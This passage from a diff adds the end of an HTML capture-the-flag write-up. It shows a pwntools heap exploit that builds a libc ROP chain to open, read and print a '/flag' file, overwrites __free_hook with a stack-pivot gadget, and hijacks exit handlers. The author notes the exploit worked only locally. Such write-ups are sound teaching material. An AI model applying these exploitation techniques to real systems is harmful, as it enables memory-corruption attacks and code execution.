+<span id="cb4-116"><a href="#cb4-116" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-117"><a href="#cb4-117" aria-hidden="true" tabindex="-1"></a>exit_funcs <span class="op">=</span> libc.address <span class="op">+</span> <span class="bn">0x3b5718</span></span>
+<span id="cb4-118"><a href="#cb4-118" aria-hidden="true" tabindex="-1"></a>base_addr <span class="op">=</span> libc.address</span>
+<span id="cb4-119"><a href="#cb4-119" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-120"><a href="#cb4-120" aria-hidden="true" tabindex="-1"></a><span class="co">#get_chain(buf_target, buf_target+0x20, base_addr)</span></span>
+<span id="cb4-121"><a href="#cb4-121" aria-hidden="true" tabindex="-1"></a><span class="co"># chain was generated with get_chain() and copied here</span></span>
+<span id="cb4-122"><a href="#cb4-122" aria-hidden="true" tabindex="-1"></a><span class="co"># seems to not work if just returned as bytes</span></span>
+<span id="cb4-123"><a href="#cb4-123" aria-hidden="true" tabindex="-1"></a>chain <span class="op">=</span> <span class="st">b&quot;&quot;</span></span>
+<span id="cb4-124"><a href="#cb4-124" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x12c561</span> <span class="op">+</span> base_addr)    <span class="co"># pop rax; pop rdx; pop rbx; ret</span></span>
+<span id="cb4-125"><a href="#cb4-125" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0xffff0067616c662f</span>)</span>
+<span id="cb4-126"><a href="#cb4-126" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(buf_target)</span>
+<span id="cb4-127"><a href="#cb4-127" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x0</span>)</span>
+<span id="cb4-128"><a href="#cb4-128" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x7d597</span> <span class="op">+</span> base_addr)    <span class="co"># mov qword ptr [rdx], rax; ret</span></span>
+<span id="cb4-129"><a href="#cb4-129" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x39000</span> <span class="op">+</span> base_addr)    <span class="co"># pop rax; ret</span></span>
+<span id="cb4-130"><a href="#cb4-130" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x3</span>)</span>
+<span id="cb4-131"><a href="#cb4-131" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0xc4cc0</span> <span class="op">+</span> base_addr)    <span class="co"># pop rdi; ret</span></span>
+<span id="cb4-132"><a href="#cb4-132" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x0</span>)</span>
+<span id="cb4-133"><a href="#cb4-133" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x39049</span> <span class="op">+</span> base_addr)    <span class="co"># syscall</span></span>
+<span id="cb4-134"><a href="#cb4-134" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0xc4cc0</span> <span class="op">+</span> base_addr)    <span class="co"># pop rdi; ret</span></span>
+<span id="cb4-135"><a href="#cb4-135" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(buf_target)</span>
+<span id="cb4-136"><a href="#cb4-136" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x221ba</span> <span class="op">+</span> base_addr)    <span class="co"># mov esi, 0x415b0007; pop rsi; ret</span></span>
+<span id="cb4-137"><a href="#cb4-137" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x0</span>)</span>
+<span id="cb4-138"><a href="#cb4-138" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x12c561</span> <span class="op">+</span> base_addr)    <span class="co"># pop rax; pop rdx; pop rbx; ret</span></span>
+<span id="cb4-139"><a href="#cb4-139" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x2</span>)</span>
+<span id="cb4-140"><a href="#cb4-140" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x0</span>)</span>
+<span id="cb4-141"><a href="#cb4-141" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x0</span>)</span>
+<span id="cb4-142"><a href="#cb4-142" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x39049</span> <span class="op">+</span> base_addr)    <span class="co"># syscall</span></span>
+<span id="cb4-143"><a href="#cb4-143" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0xc4cc0</span> <span class="op">+</span> base_addr)    <span class="co"># pop rdi; ret</span></span>
+<span id="cb4-144"><a href="#cb4-144" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x0</span>)</span>
+<span id="cb4-145"><a href="#cb4-145" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x221ba</span> <span class="op">+</span> base_addr)    <span class="co"># mov esi, 0x415b0007; pop rsi; ret</span></span>
+<span id="cb4-146"><a href="#cb4-146" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(buf_target<span class="op">+</span><span class="bn">0x20</span>)</span>
+<span id="cb4-147"><a href="#cb4-147" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x12c561</span> <span class="op">+</span> base_addr)    <span class="co"># pop rax; pop rdx; pop rbx; ret</span></span>
+<span id="cb4-148"><a href="#cb4-148" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x0</span>)</span>
+<span id="cb4-149"><a href="#cb4-149" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x100</span>)</span>
+<span id="cb4-150"><a href="#cb4-150" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x0</span>)</span>
+<span id="cb4-151"><a href="#cb4-151" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x39049</span> <span class="op">+</span> base_addr)    <span class="co"># syscall</span></span>
+<span id="cb4-152"><a href="#cb4-152" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0xc4cc0</span> <span class="op">+</span> base_addr)    <span class="co"># pop rdi; ret</span></span>
+<span id="cb4-153"><a href="#cb4-153" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x1</span>)</span>
+<span id="cb4-154"><a href="#cb4-154" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x221ba</span> <span class="op">+</span> base_addr)    <span class="co"># mov esi, 0x415b0007; pop rsi; ret</span></span>
+<span id="cb4-155"><a href="#cb4-155" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(buf_target<span class="op">+</span><span class="bn">0x20</span>)</span>
+<span id="cb4-156"><a href="#cb4-156" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x12c561</span> <span class="op">+</span> base_addr)    <span class="co"># pop rax; pop rdx; pop rbx; ret</span></span>
+<span id="cb4-157"><a href="#cb4-157" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x1</span>)</span>
+<span id="cb4-158"><a href="#cb4-158" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x100</span>)</span>
+<span id="cb4-159"><a href="#cb4-159" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x0</span>)</span>
+<span id="cb4-160"><a href="#cb4-160" aria-hidden="true" tabindex="-1"></a>chain <span class="op">+=</span> p64(<span class="bn">0x39049</span> <span class="op">+</span> base_addr)    <span class="co"># syscall</span></span>
+<span id="cb4-161"><a href="#cb4-161" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-162"><a href="#cb4-162" aria-hidden="true" tabindex="-1"></a>write_addr(<span class="bu">hex</span>(free_hook), <span class="bu">hex</span>(pivot_gadget))</span>
+<span id="cb4-163"><a href="#cb4-163" aria-hidden="true" tabindex="-1"></a>write_addr(<span class="bu">hex</span>(exit_funcs), <span class="bu">hex</span>(input_addr))</span>
+<span id="cb4-164"><a href="#cb4-164" aria-hidden="true" tabindex="-1"></a>write_block(exit_funcs<span class="op">+</span><span class="bn">0x8</span>, chain)</span>
+<span id="cb4-165"><a href="#cb4-165" aria-hidden="true" tabindex="-1"></a><span class="co"># call exit-&gt;calls __run_exit_funcs-&gt;calls free-&gt;__free_hook-&gt;stack pivot to libc rop chain</span></span>
+<span id="cb4-166"><a href="#cb4-166" aria-hidden="true" tabindex="-1"></a>p.sendline(<span class="st">&#39;5&#39;</span>)</span>
+<span id="cb4-167"><a href="#cb4-167" aria-hidden="true" tabindex="-1"></a>p.interactive()</span></code></pre></div>
+<figure>
+<img src="flag.jpg" alt="flag" />
+<figcaption aria-hidden="true">flag</figcaption>
+</figure>
+<p>I only managed to solve this locally, I couldn’t figure out what
+wasn’t working on the remote server- maybe some wrong offset somewhere.
+Still a fun challenge, which I learned a lot from</p>
+  <div class="debug-grid"></div>
+  <script src="/index.js"></script>
+</body>
+</html>
